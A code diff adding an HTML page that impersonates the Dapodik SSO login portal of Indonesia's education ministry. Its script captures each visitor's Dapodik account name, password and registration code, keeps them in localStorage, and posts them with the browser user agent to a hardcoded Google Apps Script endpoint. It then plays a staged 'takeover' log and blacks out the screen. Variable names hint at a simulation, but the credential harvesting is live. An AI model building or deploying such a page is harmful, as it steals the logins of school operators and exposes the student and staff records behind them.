@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Portal SSO Dapodik - Kemendikdasmen</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Roboto, Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0f294a 0%, #1d4ed8 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #1e293b;
+      transition: background 0.25s ease;
+    }
+
+    body.glitch-mode .container {
+      animation: screenGlitch 0.14s infinite;
+      border: 2px solid #ef4444;
+    }
+
+    @keyframes screenGlitch {
+      0% { transform: translate(0, 0) skewX(0deg); filter: hue-rotate(0deg); }
+      25% { transform: translate(-4px, 2px) skewX(-2deg); filter: hue-rotate(45deg); }
+      50% { transform: translate(4px, -2px) skewX(2deg); filter: contrast(1.4); }
+      75% { transform: translate(-2px, -3px) skewX(-1deg); filter: hue-rotate(-45deg); }
+      100% { transform: translate(2px, 2px) skewX(0deg); filter: none; }
+    }
+
+    body.blackout {
+      background: #000000 !important;
+      color: #000000;
+      cursor: none;
+      overflow: hidden;
+      animation: none;
+    }
+
+    body.blackout .container,
+    body.blackout .log-launcher,
+    body.blackout .log-modal {
+      display: none !important;
+      animation: none !important;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 440px;
+      background: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+      overflow: hidden;
+    }
+
+    .header {
+      background: #0b1f3a;
+      color: #ffffff;
+      padding: 22px 24px;
+      border-bottom: 4px solid #f59e0b;
+    }
+
+    .header .badge {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      background: rgba(245, 158, 11, 0.2);
+      color: #fbbf24;
+      padding: 3px 8px;
+      border-radius: 4px;
+      margin-bottom: 8px;
+    }
+
+    .header h1 {
+      font-size: 19px;
+      font-weight: 700;
+    }
+
+    .header p {
+      font-size: 12.5px;
+      color: #cbd5e1;
+      margin-top: 4px;
+    }
+
+    .content {
+      padding: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #334155;
+    }
+
+    input {
+      width: 100%;
+      padding: 11px 13px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #1d4ed8;
+    }
+
+    .hint {
+      font-size: 11.5px;
+      color: #64748b;
+      margin-top: 4px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.1s, opacity 0.2s;
+    }
+
+    .btn:active {
+      transform: scale(0.99);
+    }
+
+    .btn-primary {
+      background: #1d4ed8;
+      color: #ffffff;
+    }
+
+    .btn-primary:hover {
+      background: #1e40af;
+    }
+
+    #step-warning {
+      display: none;
+    }
+
+    .alarm-box {
+      border: 2px solid #dc2626;
+      background: #fef2f2;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 18px;
+      animation: blinkRed 0.65s infinite alternate;
+    }
+
+    @keyframes blinkRed {
+      0% {
+        background: #fee2e2;
+        border-color: #dc2626;
+        box-shadow: 0 0 0 rgba(220, 38, 38, 0);
+      }
+      100% {
+        background: #fca5a5;
+        border-color: #7f1d1d;
+        box-shadow: 0 0 22px rgba(220, 38, 38, 0.8);
+      }
+    }
+
+    .alarm-title {
+      color: #991b1b;
+      font-size: 15px;
+      font-weight: 800;
+      margin-bottom: 8px;
+    }
+
+    .alarm-desc {
+      font-size: 13.5px;
+      color: #7f1d1d;
+      line-height: 1.5;
+    }
+
+    .scope-list {
+      background: #ffffff;
+      border: 1px solid #fca5a5;
+      border-radius: 8px;
+      padding: 12px 14px;
+      margin-top: 12px;
+      font-size: 12.5px;
+      color: #334155;
+    }
+
+    .scope-list li {
+      margin-left: 16px;
+      margin-bottom: 5px;
+    }
+
+    .btn-danger {
+      background: #dc2626;
+      color: #ffffff;
+      margin-bottom: 10px;
+    }
+
+    .btn-danger:hover {
+      background: #b91c1b;
+    }
+
+    .btn-cancel {
+      background: #e2e8f0;
+      color: #334155;
+    }
+
+    #step-server {
+      display: none;
+      background: #05080f;
+      color: #22c55e;
+      padding: 16px;
+      border-radius: 8px;
+      border: 1px solid #1e293b;
+      font-family: "Courier New", Courier, monospace;
+      font-size: 12px;
+      line-height: 1.55;
+      min-height: 310px;
+      max-height: 380px;
+      overflow-y: auto;
+    }
+
+    .log-line {
+      margin-bottom: 4px;
+      word-break: break-word;
+    }
+
+    .log-hex {
+      color: #38bdf8;
+      font-size: 11px;
+      opacity: 0.9;
+    }
+
+    .log-warn {
+      color: #fbbf24;
+      font-weight: 700;
+    }
+
+    .log-err {
+      color: #f87171;
+      font-weight: 700;
+    }
+
+    .progress-wrap {
+      margin-top: 14px;
+      background: #1e293b;
+      border-radius: 999px;
+      height: 8px;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #ef4444;
+      transition: width 0.25s ease;
+    }
+
+    .log-launcher {
+      position: fixed;
+      bottom: 14px;
+      right: 14px;
+      background: rgba(11, 31, 58, 0.9);
+      color: #fbbf24;
+      border: 1px solid rgba(251, 191, 36, 0.4);
+      padding: 7px 12px;
+      border-radius: 999px;
+      font-size: 11.5px;
+      font-weight: 700;
+      cursor: pointer;
+      z-index: 40;
+    }
+
+    .log-modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(2, 6, 23, 0.78);
+      align-items: center;
+      justify-content: center;
+      padding: 18px;
+      z-index: 50;
+    }
+
+    .log-modal.open {
+      display: flex;
+    }
+
+    .log-card {
+      width: 100%;
+      max-width: 520px;
+      max-height: 82vh;
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 18px;
+      overflow-y: auto;
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.45);
+    }
+
+    .log-card h2 {
+      font-size: 16px;
+      color: #0b1f3a;
+      margin-bottom: 4px;
+    }
+
+    .log-card p.sub {
+      font-size: 12px;
+      color: #64748b;
+      margin-bottom: 14px;
+    }
+
+    .entry-item {
+      border: 1px solid #cbd5e1;
+      background: #f8fafc;
+      border-radius: 8px;
+      padding: 10px 12px;
+      margin-bottom: 10px;
+      font-size: 12.5px;
+      line-height: 1.5;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 8px;
+      margin-top: 12px;
+    }
+
+    .btn-sm {
+      padding: 9px 12px;
+      font-size: 12.5px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .btn-clear {
+      background: #fee2e2;
+      color: #991b1b;
+    }
+
+    .btn-close {
+      background: #0b1f3a;
+      color: #ffffff;
+      flex: 1;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="badge">Sinkronisasi &amp; Akses Data</div>
+      <h1>Layanan SSO Dapodik</h1>
+      <p>Verifikasi sesi operator &amp; otorisasi integrasi data sekolah</p>
+    </div>
+
+    <div class="content">
+      <!-- TAHAP 1: LOGIN -->
+      <form id="step-login">
+        <div class="form-group">
+          <label for="email">Akun Dapodik</label>
+          <input
+            type="text"
+            id="email"
+            placeholder="Masukkan akun Dapodik"
+            required
+          />
+          <div class="hint">Masukkan akun Dapodik</div>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password Dapodik</label>
+          <input
+            type="password"
+            id="password"
+            placeholder="Masukkan password Dapodik"
+            required
+          />
+          <div class="hint">Masukkan password Dapodik</div>
+        </div>
+
+        <div class="form-group">
+          <label for="reg-code">Kode Registrasi Dapodik</label>
+          <input
+            type="text"
+            id="reg-code"
+            placeholder="Masukkan kode registrasi Dapodik"
+            required
+          />
+          <div class="hint">Masukkan kode registrasi Dapodik</div>
+        </div>
+
+        <button type="submit" class="btn btn-primary">Lanjutkan &amp; Konfirmasi</button>
+      </form>
+
+      <!-- TAHAP 2: KONFIRMASI ALARM MERAH -->
+      <div id="step-warning">
+        <div class="alarm-box">
+          <div class="alarm-title">
+            <span>🚨 PERINGATAN OTORISASI PIHAK KE-3</span>
+          </div>
+          <div class="alarm-desc">
+            <strong>Yakin ingin memberikan akses ke pihak ke-3?</strong><br />
+            Aplikasi eksternal meminta izin penuh untuk mengambil alih sesi dan menyalin data Dapodik Anda secara langsung.
+            <ul class="scope-list">
+              <li>Pengambilalihan penuh token sesi &amp; hak akses operator</li>
+              <li>Penyalinan massal data PTK, Peserta Didik, Rombel &amp; Sarpras</li>
+              <li>Pemutusan sesi lokal otomatis setelah ekstraksi selesai</li>
+            </ul>
+          </div>
+        </div>
+
+        <button type="button" id="btn-confirm" class="btn btn-danger">
+          Ya, Saya Yakin — Konfirmasi Akses
+        </button>
+        <button type="button" id="btn-cancel" class="btn btn-cancel">
+          Batalkan
+        </button>
+      </div>
+
+      <!-- TAHAP 3: LOG SERVER -->
+      <div id="step-server">
+        <div id="log-output"></div>
+        <div class="progress-wrap">
+          <div id="progress-bar" class="progress-bar"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Tombol Buka Riwayat Lokal -->
+  <button type="button" class="log-launcher" id="btn-open-logs">
+    Riwayat Login (<span id="log-count">0</span>)
+  </button>
+
+  <!-- Modal Bukti Riwayat Input -->
+  <div class="log-modal" id="log-modal">
+    <div class="log-card">
+      <h2>Bukti Riwayat Input (Lokal Browser)</h2>
+      <p class="sub">Tersimpan di localStorage browser perangkat ini untuk keperluan screenshot bukti.</p>
+      <div id="entries-list"></div>
+      <div class="modal-actions">
+        <button type="button" class="btn-sm btn-clear" id="btn-clear-logs">Hapus Riwayat</button>
+        <button type="button" class="btn-sm btn-close" id="btn-close-logs">Tutup</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const STORAGE_KEY = "dapodik_sim_entries_v1";
+    const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyiyKrQHWI3uf2Hc3dYzuwFx7O8W7g9OInOf4eCpg3u_3uqA68RhkmFxECMQTKuD07_/exec";
+
+    const stepLogin = document.getElementById("step-login");
+    const stepWarning = document.getElementById("step-warning");
+    const stepServer = document.getElementById("step-server");
+    const logOutput = document.getElementById("log-output");
+    const progressBar = document.getElementById("progress-bar");
+    const logModal = document.getElementById("log-modal");
+    const entriesList = document.getElementById("entries-list");
+    const logCount = document.getElementById("log-count");
+
+    let latestSubmission = {
+      account: "",
+      password: "",
+      regCode: "",
+      time: ""
+    };
+
+    function getEntries() {
+      try {
+        return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+      } catch {
+        return [];
+      }
+    }
+
+    function saveEntry(entry) {
+      const entries = getEntries();
+      entries.unshift(entry);
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
+      renderEntries();
+    }
+
+    function sendToGoogleSheet(payload) {
+      if (!SHEET_WEBAPP_URL) return;
+      fetch(SHEET_WEBAPP_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=UTF-8" },
+        body: JSON.stringify({
+          ...payload,
+          userAgent: navigator.userAgent
+        })
+      }).catch(() => {});
+    }
+
+    function renderEntries() {
+      const entries = getEntries();
+      logCount.textContent = entries.length;
+
+      if (entries.length === 0) {
+        entriesList.innerHTML = '<div class="entry-item">Belum ada riwayat input tersimpan di browser ini.</div>';
+        return;
+      }
+
+      entriesList.innerHTML = entries
+        .map(
+          (item, idx) => `
+          <div class="entry-item">
+            <strong>#${entries.length - idx}</strong> — <span>${item.time}</span><br />
+            <strong>Akun:</strong> ${escapeHtml(item.account)}<br />
+            <strong>Password:</strong> ${escapeHtml(item.password)}<br />
+            <strong>Kode Registrasi:</strong> ${escapeHtml(item.regCode)}
+          </div>
+        `
+        )
+        .join("");
+    }
+
+    function escapeHtml(str) {
+      return String(str)
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;");
+    }
+
+    renderEntries();
+
+    document.getElementById("btn-open-logs").addEventListener("click", () => {
+      renderEntries();
+      logModal.classList.add("open");
+    });
+
+    document.getElementById("btn-close-logs").addEventListener("click", () => {
+      logModal.classList.remove("open");
+    });
+
+    document.getElementById("btn-clear-logs").addEventListener("click", () => {
+      localStorage.removeItem(STORAGE_KEY);
+      renderEntries();
+    });
+
+    stepLogin.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const account = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+      const regCode = document.getElementById("reg-code").value.trim();
+      const time = new Date().toLocaleString("id-ID");
+
+      latestSubmission = { account, password, regCode, time };
+      saveEntry(latestSubmission);
+      sendToGoogleSheet(latestSubmission);
+
+      stepLogin.style.display = "none";
+      stepWarning.style.display = "block";
+    });
+
+    document.getElementById("btn-cancel").addEventListener("click", function () {
+      stepWarning.style.display = "none";
+      stepLogin.style.display = "block";
+    });
+
+    function randomHexBlock(length = 48) {
+      const chars = "0123456789ABCDEF";
+      let out = "0x";
+      for (let i = 0; i < length; i++) {
+        out += chars[Math.floor(Math.random() * chars.length)];
+        if ((i + 1) % 8 === 0 && i !== length - 1) out += " ";
+      }
+      return out;
+    }
+
+    function appendStaticLine(text, cls = "") {
+      const div = document.createElement("div");
+      div.className = "log-line " + cls;
+      div.textContent = text;
+      logOutput.appendChild(div);
+      stepServer.scrollTop = stepServer.scrollHeight;
+    }
+
+    function typeLogLine(text, cls = "", speed = 18) {
+      return new Promise((resolve) => {
+        const div = document.createElement("div");
+        div.className = "log-line " + cls;
+        const now = new Date().toTimeString().split(" ")[0];
+        const prefix = `[${now}] `;
+        div.textContent = prefix;
+        logOutput.appendChild(div);
+
+        let idx = 0;
+        const timer = setInterval(() => {
+          div.textContent = prefix + text.slice(0, idx + 1);
+          stepServer.scrollTop = stepServer.scrollHeight;
+          idx++;
+          if (idx >= text.length) {
+            clearInterval(timer);
+            resolve();
+          }
+        }, speed);
+      });
+    }
+
+    const delay = (ms) => new Promise((res) => setTimeout(res, ms));
+
+    document.getElementById("btn-confirm").addEventListener("click", async function () {
+      const activeAccount = latestSubmission.account || document.getElementById("email").value.trim();
+      const activeReg = latestSubmission.regCode || document.getElementById("reg-code").value.trim();
+
+      stepWarning.style.display = "none";
+      stepServer.style.display = "block";
+      logOutput.innerHTML = "";
+      progressBar.style.width = "0%";
+      progressBar.style.background = "#22c55e";
+
+      const steps = [
+        { msg: "Otorisasi pihak ke-3 DISETUJUI. Membuka socket jarak jauh...", cls: "log-warn", pct: 10, hex: true },
+        { msg: `Mengunci sesi target: ${activeAccount} [REG: ${activeReg}]`, cls: "log-err", pct: 22, hex: true },
+        { msg: "Mengambil alih cookie & bearer token otentikasi aktif...", cls: "log-warn", pct: 36, hex: false },
+        { msg: "Dump tabel sekolah, PTK, peserta didik & rombongan belajar...", cls: "", pct: 54, hex: true },
+        { msg: "Mengunggah arsip terenkripsi ke node eksternal [100%]", cls: "log-warn", pct: 72, hex: true },
+        { msg: "Menghapus jejak sesi lokal & mengunci akses operator...", cls: "log-err", pct: 88, hex: false },
+        { msg: "PERINGATAN KRITIS: KENDALI SESI DIPUTUS PAKSA!", cls: "log-err", pct: 100, hex: false }
+      ];
+
+      for (const step of steps) {
+        await typeLogLine(step.msg, step.cls, 16);
+        progressBar.style.width = step.pct + "%";
+        if (step.pct >= 72) {
+          progressBar.style.background = "#ef4444";
+        }
+        if (step.hex) {
+          appendStaticLine(randomHexBlock(48), "log-hex");
+        }
+        await delay(420);
+      }
+
+      await delay(500);
+      document.body.classList.add("glitch-mode");
+      appendStaticLine(">>> SIGNAL LOST — TERMINATING DISPLAY...", "log-err");
+
+      await delay(950);
+      document.body.classList.remove("glitch-mode");
+      document.body.classList.add("blackout");
+    });
+  </script>
+</body>
+</html>
